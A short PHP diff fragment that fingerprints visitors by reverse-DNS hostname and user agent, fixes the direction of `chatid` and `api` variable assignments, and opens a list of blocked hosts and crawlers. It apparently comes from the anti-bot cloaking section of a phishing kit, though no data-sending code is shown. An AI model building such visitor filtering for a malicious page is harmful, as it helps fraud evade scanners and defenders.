@@ -182,8 +182,8 @@ function whois()
 
 $hostname = gethostbyaddr($_SERVER["REMOTE_ADDR"]); $ua = strtolower($_SERVER["HTTP_USER_AGENT"]); $visit = whois();
 
-$chatid=$ch;
-$api=$i;
+$ch=$chatid;
+$i=$api;
 $badHosts = array(
     "colocrossing.com",
     "QuerySeekerSpider",
